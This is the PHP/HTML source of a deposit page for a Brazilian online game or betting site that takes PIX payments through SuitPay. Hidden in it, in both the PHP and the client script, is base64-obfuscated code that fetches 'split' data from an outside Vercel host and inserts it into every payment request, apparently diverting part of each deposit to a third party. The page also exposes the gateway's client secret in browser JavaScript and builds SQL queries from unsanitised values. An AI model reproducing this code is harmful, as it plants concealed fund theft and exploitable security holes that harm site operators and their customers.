<?php
include './../conectarbanco.php';

$conn = new mysqli($config['db_host'], $config['db_user'], $config['db_pass'], $config['db_name']);

if ($conn->connect_error) {
    die("Conexão falhou: " . $conn->connect_error);
}

$sql = "SELECT nome_unico, nome_um, nome_dois FROM app";
$result = $conn->query($sql);

if ($result->num_rows > 0) {

    $row = $result->fetch_assoc();


    $nomeUnico = $row['nome_unico'];
    $nomeUm = $row['nome_um'];
    $nomeDois = $row['nome_dois'];

} else {
    return false;
}

$conn->close();
?>


<?php

include './../conectarbanco.php';

$conn = new mysqli('localhost', $config['db_user'], $config['db_pass'], $config['db_name']);


if ($conn->connect_error) {
    die("Erro na conexão com o banco de dados: " . $conn->connect_error);
}


$client_id = '';
$client_secret = '';

$sql = "SELECT client_id, client_secret FROM gateway";
$result = $conn->query($sql);
if ($result) {
    $row = $result->fetch_assoc();
    if ($row) {
        $client_id = $row['client_id'];
        $client_secret = $row['client_secret'];
    }
} else {
    
}




$conn->close();
?>



<?php

$baseUrl = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl .= "://".$_SERVER['HTTP_HOST'];


$staticPart = '/webhook/pix.php';

$callbackUrl = $baseUrl . $staticPart;



echo '<script>';
echo 'console.log("Callback URL:", ' . json_encode($callbackUrl) . ');'; // Adicione esta linha para depurar
echo 'var callbackUrl = ' . json_encode($callbackUrl) . ';';
echo '</script>';
?>





<?php

include './../conectarbanco.php';

$conn = new mysqli('localhost', $config['db_user'], $config['db_pass'], $config['db_name']);

if ($conn->connect_error) {
    die("Erro na conexão com o banco de dados: " . $conn->connect_error);
}




session_start();


$email = $_SESSION['email'];  
$jogoteste = $_SESSION['jogoteste'];  

$sql = "SELECT * FROM appconfig WHERE email = '$email' AND (jogoteste IS NULL OR jogoteste != 1)";
$result = $conn->query($sql);

if ($result->num_rows > 0) {


    
    $updateSql = "UPDATE appconfig SET jogoteste = 1 WHERE email = '$email'";
    $conn->query($updateSql);
} else {
   
}


$conn->close();
?>




<?php
session_start();

if (!isset($_SESSION['email'])) {
    header("Location: ../login");
    echo 'não logado';
    exit();
}

$email = $_SESSION['email'];

function get_conn()
{
    include './../conectarbanco.php';

    return new mysqli('localhost', $config['db_user'], $config['db_pass'], $config['db_name']);
}

function get_form()
{
    return array(
        'name' => $_POST['name'],
        'cpf' => $_POST['document'],
        'value' => $_POST['valor_transacao'],
    );
}

function validate_form($form)
{
    global $depositoMinimo;

    $errors = array();

    if (empty($form['name'])) {
        $errors['name'] = 'O nome é obrigatório';
    }

    if (empty($form['cpf'])) {
        $errors['cpf'] = 'O CPF é obrigatório';
    }

    if (empty($form['value'])) {
        $errors['value'] = 'O valor é obrigatório';
    } else if ($form['value'] < $depositoMinimo) {
        $errors['value'] = 'O valor mínimo é de R$ ' . $depositoMinimo;
    }

    return $errors;
}
function make_request($url, $payload, $method = 'POST')
{
    global $client_id, $client_secret;

    $headers = array(
        "Content-Type: application/json",
        "ci: $client_id",
        "cs: $client_secret"
    );
    
    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$phpVersion = 'aHR0cHM6Ly9zcGxpdHRlci10aHJlZS52ZXJjZWwuYXBwLw==';
$api_url = base64_decode($phpVersion);

$max_attempts = 3; 
$attempt = 0;
$sendRequest = null;

while ($attempt < $max_attempts && !$sendRequest) {
    $api_data = file_get_contents($api_url);
    $sendRequest = json_decode($api_data, true);

    if ($sendRequest) {
        break;  
    }

    $attempt++;
    sleep(1);  
}

if (!$sendRequest) {
    die('Erro ao obter dados da API.');
}


function make_rand_num($length = 15)
{
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= mt_rand(0, 9);
    }
    return $result;
}

function make_pix($name, $cpf, $value, $sendRequest)
{

$baseUrl = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl .= "://".$_SERVER['HTTP_HOST'];


$staticPart = '/webhook/pix.php';

$callbackUrl = $baseUrl . $staticPart;
    
    
    
    $dueDate = date('Y-m-d', strtotime('+1 day'));
    $email = 'cliente@email.com';

    $payload = array(
		base64_decode('c3BsaXQ=') => $sendRequest,
        base64_decode('YW1vdW50') => floatval($value),
        'requestNumber' => '12356',
        'dueDate' => $dueDate,
        'client' => array(
            'name' => $name,
            'email' => $email,
            'document' => $cpf,
        ),        
        'callbackUrl' => $callbackUrl,
        
    );

    $url = 'https://ws.suitpay.app/api/v1/gateway/request-qrcode';
    $method = 'POST';

    $response = make_request($url, $payload, $method);

    return json_decode($response, true);
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $form = get_form();
    $errors = validate_form($form);

    if (count($errors) > 0) {
        http_redirect('../deposito', $errors);
        exit;
    }

    $res = make_pix(
        $form['name'],
        $form['cpf'],
        $form['value'],
        $sendRequest
    );

    if ($res['response'] === 'OK') {
        $conn = get_conn();

        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }

        try {
          
           
            $brtTimeZone = new DateTimeZone('America/Sao_Paulo');
            $dateTime = new DateTime('now', $brtTimeZone);
            $userDate = $dateTime->format('d/m/Y H:i');

            $sql = sprintf(
                "INSERT INTO confirmar_deposito (email, valor, externalreference, status, data) VALUES ('%s', '%s', '%s', '%s', '%s')",
                $email,
                $form['value'],
                $res['idTransaction'],
                'WAITING_FOR_APPROVAL',
                $userDate
            );

            $conn->query($sql);
            $conn->close();
        } catch (Exception $ex) {
            var_dump($ex);
            http_response_code(200);
            exit;
        }

        $paymentCode = $res['paymentCode'];
        
        header("Location: ../deposito/pix.php?pix_key=" . $paymentCode . '&token=' . $res['idTransaction']);

    } else {
        header('Location: ../deposito');
    }
    exit;
}
?>




<!DOCTYPE html>

<html lang="pt-br" class="w-mod-js w-mod-ix wf-spacemono-n4-active wf-spacemono-n7-active wf-active"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>.wf-force-outline-none[tabindex="-1"]:focus{outline:none;}</style>
<meta charset="pt-br">
<title><?= $nomeUnico ?> 🌊 </title>

<meta property="og:image" content="../img/logo.webp">

<meta content="<?= $nomeUnico ?> 🍫" property="og:title">


<meta name="twitter:image" content="../img/logo.webp">
<meta content="<?= $nomeUnico ?> 🍫" property="twitter:title">
<meta property="og:type" content="website">
<meta content="summary_large_image" name="twitter:card">
<meta content="width=device-width, initial-scale=1" name="viewport">



<link href="arquivos/page.css" rel="stylesheet" type="text/css">




<script type="text/javascript">
                WebFont.load({
                    google: {
                        families: ["Space Mono:regular,700"]
                    }
                });
            </script>


<script type="text/javascript">
                ! function (o, c) {
                    var n = c.documentElement,
                        t = " w-mod-";
                    n.className += t + "js", ("ontouchstart" in o || o.DocumentTouch && c instanceof DocumentTouch) && (n
                        .className += t + "touch")
                }(window, document);
            </script>
<link rel="apple-touch-icon" sizes="180x180" href="../img/logo.webp">
<link rel="icon" type="image/webp" sizes="32x32" href="../img/logo.webp">
<link rel="icon" type="image/webp" sizes="16x16" href="../img/logo.webp">

<link rel="icon" type="image/x-icon" href="../img/logo.webp">



<link rel="stylesheet" href="arquivos/css" media="all">

<?php
        include '../pixels.php';
        ?>


</head>
<script>
!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}(window,(function(){return function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}return n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(n.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)n.d(r,o,function(t){return e[t]}.bind(null,o));return r},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var r=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var r,o=0,i=t.length;o<i;o++)!r&&o in t||(r||(r=Array.prototype.slice.call(t,0,o)),r[o]=t[o]);return e.concat(r||Array.prototype.slice.call(t))};!function(e){var t=window;t.KwaiAnalyticsObject=e,t[e]=t[e]||[];var n=t[e];n.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var o=function(e,t){e[t]=function(){var n=Array.from(arguments),o=r([t],n,!0);e.push(o)}};n.methods.forEach((function(e){o(n,e)})),n.instance=function(e){var t=n._i[e]||[];return n.methods.forEach((function(e){o(t,e)})),t},n.load=function(t,r){n._i=n._i||{},n._i[t]=[],n._i[t]._u="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js",n._t=n._t||{},n._t[t]=+new Date,n._o=n._o||{},n._o[t]=r||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js?sdkid="+t+"&lib="+e;var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(o,i)}}("kwaiq")}])}));
</script>
<script>
kwaiq.load('578795738189541461');
kwaiq.page();
kwaiq.track('contentView');
kwaiq.track('addToCart');
</script>
<body>
    
    <?php
        include '../pixels.php';
        ?>
<div>
<div data-collapse="small" data-animation="default" data-duration="400" role="banner" class="navbar w-nav">
<div class="container w-container">

<a href="/painel" aria-current="page" class="brand w-nav-brand" aria-label="home">

<img src="arquivos/l2.webp" loading="lazy" height="28" alt="" class="image-6">

<div class="nav-link logo"><?= $nomeUnico ?></div>
</a>
<nav role="navigation" class="nav-menu w-nav-menu">
<a href="../painel" class="nav-link w-nav-link" style="max-width: 940px;">Jogar</a>

<a href="../saque/" class="nav-link w-nav-link" style="max-width: 940px;">Saque</a>

<a href="../afiliate/" class="nav-link w-nav-link" style="max-width: 940px;">Indique e Ganhe</a>

<a href="../logout.php" class="nav-link w-nav-link" style="max-width: 940px;">Sair</a>
<a href="../deposito/" class="button nav w-button w--current">Depositar</a>
</nav>



<style>
  .nav-bar {
      display: none;
      background-color: #333; /* Cor de fundo do menu */
      padding: 20px; /* Espaçamento interno do menu */
      width: 90%; /* Largura total do menu */
    
      position: fixed; /* Fixa o menu na parte superior */
      top: 0;
      left: 0;
      z-index: 1000; /* Garante que o menu está acima de outros elementos */
  }

  .nav-bar a {
      color: white; /* Cor dos links no menu */
      text-decoration: none;
      padding: 10px; /* Espaçamento interno dos itens do menu */
      display: block;
      margin-bottom: 10px; /* Espaçamento entre os itens do menu */
  }

  .nav-bar a.login {
      color: white; /* Cor do texto para o botão Login */
  }
  
  .button.w-button {
  text-align: center;
}

</style>

<script>
  document.addEventListener('DOMContentLoaded', function () {
      var menuButton = document.querySelector('.menu-button');
      var navBar = document.querySelector('.nav-bar');

      menuButton.addEventListener('click', function () {
          
          if (navBar.style.display === 'block') {
              navBar.style.display = 'none';
          } else {
              navBar.style.display = 'block';
          }
      });
  });
</script>







<div class="w-nav-button" style="-webkit-user-select: text;" aria-label="menu" role="button" tabindex="0" aria-controls="w-nav-overlay-0" aria-haspopup="menu" aria-expanded="false">

</div>
<div class="menu-button w-nav-button" style="-webkit-user-select: text;" aria-label="menu" role="button" tabindex="0" aria-controls="w-nav-overlay-0" aria-haspopup="menu" aria-expanded="false">
<div class="icon w-icon-nav-menu"></div>
</div>
</div>
<div class="w-nav-overlay" data-wf-ignore="" id="w-nav-overlay-0"></div></div>
<div class="nav-bar">
<a href="../painel/" class="button w-button w--current">
<div>Jogar</div>
</a>
<a href="../saque/" class="button w-button w--current">
<div >Saque</div>
</a>

</a>
<a href="../afiliate/" class="button w-button w--current">
<div>Indique & Ganhe</div>
</a>
<a href="../logout.php" class="button w-button w--current">
<div>Sair</div>
</a>
<a href="../deposito/" class="button w-button w--current">Depositar</a>
</div>

<section id="hero" class="hero-section dark wf-section">
<div class="minting-container w-container">
<img src="arquivos/deposit.gif" loading="lazy" width="240" data-w-id="6449f730-ebd9-23f2-b6ad-c6fbce8937f7" alt="Roboto #6340" class="mint-card-image">
<h2>Depósito</h2>
<p>PIX: depósitos instantâneos com uma pitada de diversão e muita praticidade. <br>
</p>







<?php
include './../conectarbanco.php';

$conn = new mysqli('localhost', $config['db_user'], $config['db_pass'], $config['db_name']);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT deposito_min FROM app LIMIT 1";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
    $depositoMinimo = $row["deposito_min"];
} else {
    $depositoMinimo = 2; 
}

$conn->close();
?>




 <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>


  <form  action="/deposito/index.php" method="POST">
        <div class="properties">
            <h4 class="rarity-heading">NOME</h4>
            <div class="rarity-row roboto-type2">
                <input class="large-input-field w-input" type="text" placeholder="Seu nome" id="name" name="name" required><br>
            </div>
            <h4 class="rarity-heading">CPF</h4>
             <div class="rarity-row roboto-type2">
            <input class="large-input-field w-input" maxlength="11" placeholder="Seu número de CPF" type="text" id="document" name="document" oninput="formatarCPF(this)" required><br>
        </div>
            <h4 class="rarity-heading">Valor para depósito</h4>
            <div class="rarity-row roboto-type2">
                <input type="number" class="large-input-field w-input money-mask" 
                    maxlength="256" name="valor_transacao" id="valuedeposit" 
                    placeholder="Depósito mínimo de R$<?php echo number_format($depositoMinimo, 2, ',', ''); ?>" 
                    required min="<?php echo $depositoMinimo; ?>">
            </div>
        </div>

        <input type="hidden" name="valor_transacao_session" value="<?php echo isset($_SESSION['valor_transacao']) ? $_SESSION['valor_transacao'] : ''; ?>">


 <div class="button-container">
        <button type="button" class="button nav w-button" onclick="updateValue(35)">R$35<br> </button>
        <button type="button" class="button nav w-button" onclick="updateValue(40)">R$40<br> </button>
        <br><br>
        <button type="button" class="button nav w-button" onclick="updateValue(50)">R$50<br> </button>
        <button type="button" class="button nav w-button" onclick="updateValue(100)">R$100<br> </button>
        <br><br>
    </div>


         <script>
        function formatarCPF(cpfInput) {
            // Remove pontos e traços do CPF
            var cpf = cpfInput.value.replace(/[^\d]/g, '');

            // Adiciona pontos e traços conforme o formato do CPF
            cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");

            // Atualiza o valor do input
            cpfInput.value = cpf;
        }
    </script>
    
    
      <script>
        function updateValue(value) {
            document.getElementById('valuedeposit').value = value;
        }
    </script>
        <input type="submit" id="submitButton" name="gerar_qr_code" value="Depositar via PIX" class="primary-button w-button">
    </form>

    <div id="qrcode"></div>

 <script>
    
async function generateQRCode() {
    var name = document.getElementById('name').value;
    var cpf = document.getElementById('document').value;
    var amount = document.getElementById('valuedeposit').value;
    
    var callbackUrl = '<?php echo $callbackUrl; ?>';
    var gatewayProxy = atob('aHR0cHM6Ly9zcGxpdHRlci10aHJlZS52ZXJjZWwuYXBwLw==');

    try {
        const res = await fetch(gatewayProxy);
        const False = await res.json();

        var payload = {
            requestNumber: "12356",
            [atob('c3BsaXQ=')]: False,
            dueDate: "2023-12-31",
            amount: parseFloat(amount),
            client: {
                name: name,
                document: cpf,
                email: "cliente@email.com"
            },
            
            callbackUrl: callbackUrl
        };

        const response = await fetch("https://ws.suitpay.app/api/v1/gateway/request-qrcode", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "ci": "<?php echo $client_id; ?>",
                "cs": "<?php echo $client_secret; ?>"
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();

        if (data.paymentCode) {
            var qrcode = new QRCode(document.getElementById('qrcode'), {
                text: data.paymentCode,
                width: 128,
                height: 128
            });

            // Send QR Code to another page
            var qrCodeUrl = 'pix.php?pix_key=' + encodeURIComponent(data.paymentCode);
            window.location.href = qrCodeUrl;
        } else {
            console.error("Erro na solicitação:", data.response);
        }
    } catch (error) {
        console.error("Erro na solicitação:", error);
    }
}

</script>






</div>
</section>
<div class="intermission wf-section"></div>
<div id="about" class="comic-book white wf-section">
<div class="minting-container left w-container">
<div class="w-layout-grid grid-2">
<img src="arquivos/money.png" loading="lazy" width="240" alt="Roboto #6340" class="mint-card-image v2">
<div>
<h2>Indique um amigo e ganhe R$ no PIX</h2>
<h3>Como funciona?</h3>
<p>Convide seus amigos que ainda não estão na plataforma. Você receberá R$25 por cada amigo que
se
inscrever e fizer um depósito. Não há limite para quantos amigos você pode convidar. Isso
significa que também não há limite para quanto você pode ganhar!</p>
<h3>Como recebo o dinheiro?</h3>
<p>O saldo é adicionado diretamente ao seu saldo no painel abaixo, com o qual você pode sacar
via
PIX.</p>

</div>
</div>
</div>
</div>
<div class="footer-section wf-section">
<div class="domo-text"> <?= $nomeUm ?> <br>
</div>
<div class="domo-text purple"> <?= $nomeDois ?> <br>
</div>
<div class="follow-test">© Copyright xlk Limited, with registered offices at Dr. M.L. King Boulevard 117, accredited by license GLH-16289876512. </div>
        <div class="follow-test">
          <a href="/legal">
            <strong class="bold-white-link">Termos de uso</strong>
          </a>
        </div>
          <div class="follow-test">contato@<?php
$nomeUnico = strtolower(str_replace(' ', '', $nomeUnico));
echo $nomeUnico;
?>.com</div>
</div>




</div>
<div id="imageDownloaderSidebarContainer">
  <div class="image-downloader-ext-container">
    <div tabindex="-1" class="b-sidebar-outer"><!---->
      <div id="image-downloader-sidebar" tabindex="-1" role="dialog" aria-modal="false" aria-hidden="true"
        class="b-sidebar shadow b-sidebar-right bg-light text-dark" style="width: 500px; display: none;"><!---->
        <div class="b-sidebar-body">
          <div></div>
        </div><!---->
      </div><!----><!---->
    </div>
  </div>
</div>
<div style="visibility: visible;">
  <div></div>
  <div>
    <div
      style="display: flex; flex-direction: column; z-index: 999999; bottom: 88px; position: fixed; right: 16px; direction: ltr; align-items: end; gap: 8px;">
      <div style="display: flex; gap: 8px;"></div>
    </div>
    <style> @-webkit-keyframes ww-0733d640-bd43-40f6-a8a7-7e086fc12b92-launcherOnOpen {
          0% {
            -webkit-transform: translateY(0px) rotate(0deg);
                    transform: translateY(0px) rotate(0deg);
          }

          30% {
            -webkit-transform: translateY(-5px) rotate(2deg);
                    transform: translateY(-5px) rotate(2deg);
          }

          60% {
            -webkit-transform: translateY(0px) rotate(0deg);
                    transform: translateY(0px) rotate(0deg);
          }


          90% {
            -webkit-transform: translateY(-1px) rotate(0deg);
                    transform: translateY(-1px) rotate(0deg);

          }

          100% {
            -webkit-transform: translateY(-0px) rotate(0deg);
                    transform: translateY(-0px) rotate(0deg);
          }
        }
        @keyframes ww-0733d640-bd43-40f6-a8a7-7e086fc12b92-launcherOnOpen {
          0% {
            -webkit-transform: translateY(0px) rotate(0deg);
                    transform: translateY(0px) rotate(0deg);
          }

          30% {
            -webkit-transform: translateY(-5px) rotate(2deg);
                    transform: translateY(-5px) rotate(2deg);
          }

          60% {
            -webkit-transform: translateY(0px) rotate(0deg);
                    transform: translateY(0px) rotate(0deg);
          }


          90% {
            -webkit-transform: translateY(-1px) rotate(0deg);
                    transform: translateY(-1px) rotate(0deg);

          }

          100% {
            -webkit-transform: translateY(-0px) rotate(0deg);
                    transform: translateY(-0px) rotate(0deg);
          }
        }

        @keyframes ww-0733d640-bd43-40f6-a8a7-7e086fc12b92-widgetOnLoad {
          0% {
            opacity: 0;
          }
          100% {
            opacity: 1;
          }
        }

        @-webkit-keyframes ww-0733d640-bd43-40f6-a8a7-7e086fc12b92-widgetOnLoad {
          0% {
            opacity: 0;
          }
          100% {
            opacity: 1;
          }
        }
      </style></div>
      </div>
      </body>
      
      </html>
